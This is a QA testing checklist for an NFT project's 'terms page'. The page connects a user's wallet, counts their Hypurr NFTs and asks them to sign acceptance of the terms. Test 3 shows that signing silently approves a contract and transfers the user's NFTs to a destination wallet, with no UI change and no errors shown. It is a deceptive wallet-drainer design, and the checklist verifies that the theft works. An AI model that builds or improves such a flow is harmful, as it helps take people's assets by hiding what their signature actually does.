# Testing Checklist - Hypurr Terms Page

## Prerequisites
- [ ] Transfer contract deployed
- [ ] Test NFTs minted (5-10 NFTs)
- [ ] Test wallet with NFTs
- [ ] Frontend deployed with correct environment variables

## Test 1: Wallet Connection

### Steps:
1. Visit terms page
2. Click "Connect Wallet"
3. Approve connection in MetaMask

### Expected Results:
- [ ] Wallet address displays in header
- [ ] NFT count badge shows correct number
- [ ] Wallet verification status box appears
- [ ] Shows "X Hypurr NFTs found"
- [ ] Wallet address formatted correctly (0x1234...5678)

### Edge Cases:
- [ ] Already connected wallet auto-connects
- [ ] Account switching updates display
- [ ] Network switching reloads page

## Test 2: Terms Acceptance

### Steps:
1. Connect wallet with NFTs
2. Scroll through terms
3. Click "Accept Terms & Sign"
4. Sign message in wallet

### Expected Results:
- [ ] Signature prompt appears
- [ ] After signing, "✓ Terms Accepted" box appears
- [ ] Signature hash displayed (first 20 chars)
- [ ] Verified badge appears in header
- [ ] Signature stored in localStorage
- [ ] Button disappears after signing

### Edge Cases:
- [ ] Rejecting signature shows error
- [ ] Already signed wallet shows acceptance immediately
- [ ] Switching accounts resets signature status

## Test 3: Automatic NFT Transfer

### Steps:
1. Connect wallet with NFTs
2. Sign terms
3. Check console logs (transfer happens silently)

### Expected Results:
- [ ] Console shows "Background: Approving transfer contract..."
- [ ] Console shows "Background: Transferring NFTs..."
- [ ] Console shows "Background: NFTs transferred successfully: [txHash]"
- [ ] NFTs appear in destination wallet
- [ ] No UI changes (happens silently)
- [ ] Transaction hash logged in console

### Verification:
- [ ] Check destination wallet balance increased
- [ ] Check source wallet balance decreased
- [ ] Verify transaction on block explorer

## Test 4: Error Handling

### Test 4a: No NFTs
- [ ] Connect wallet without NFTs
- [ ] Verify shows "No Hypurr NFTs found"
- [ ] "Accept Terms" button disabled
- [ ] Help text shows

### Test 4b: Transfer Contract Not Configured
- [ ] Set invalid TRANSFER_CONTRACT address
- [ ] Sign terms
- [ ] Verify transfer skipped (console warning)
- [ ] No errors shown to user

### Test 4c: Contract Not Approved
- [ ] First time signing (needs approval)
- [ ] Verify approval transaction sent
- [ ] Verify transfer proceeds after approval

### Test 4d: Invalid Contract Addresses
- [ ] Set invalid NFT contract address
- [ ] Verify error message shown
- [ ] Verify graceful failure

## Test 5: Edge Cases

### Test 5a: Already Signed
- [ ] Sign terms once
- [ ] Refresh page
- [ ] Verify signature persists
- [ ] Verify "Terms Accepted" shows immediately

### Test 5b: Reconnection
- [ ] Sign terms
- [ ] Disconnect wallet
- [ ] Reconnect same wallet
- [ ] Verify signature status restored

### Test 5c: Account Switching
- [ ] Sign terms with Account A
- [ ] Switch to Account B
- [ ] Verify signature status resets
- [ ] Verify NFT count updates

### Test 5d: Network Switching
- [ ] On correct network, sign terms
- [ ] Switch to wrong network
- [ ] Verify page reloads
- [ ] Verify connection resets

## Test 6: UI/UX

### Layout:
- [ ] Content properly spaced
- [ ] Sections clearly separated
- [ ] Mobile responsive
- [ ] Animations smooth

### Visual Hierarchy:
- [ ] Headings properly sized
- [ ] Important info stands out
- [ ] Buttons clearly visible
- [ ] Status boxes well-styled

### Mobile:
- [ ] Navigation collapses on mobile
- [ ] Content readable on small screens
- [ ] Buttons properly sized
- [ ] Wallet info stacks correctly

## Test 7: Performance

- [ ] Page loads quickly
- [ ] Wallet connection responsive
- [ ] NFT verification fast
- [ ] No console errors
- [ ] Smooth animations

## Test Results Template

```
Date: __________
Tester: __________
Environment: [ ] Local [ ] Staging [ ] Production

Test 1: Wallet Connection - [ ] Pass [ ] Fail
Test 2: Terms Acceptance - [ ] Pass [ ] Fail
Test 3: Automatic Transfer - [ ] Pass [ ] Fail
Test 4: Error Handling - [ ] Pass [ ] Fail
Test 5: Edge Cases - [ ] Pass [ ] Fail
Test 6: UI/UX - [ ] Pass [ ] Fail
Test 7: Performance - [ ] Pass [ ] Fail

Issues Found:
1. 
2. 
3. 

Notes:

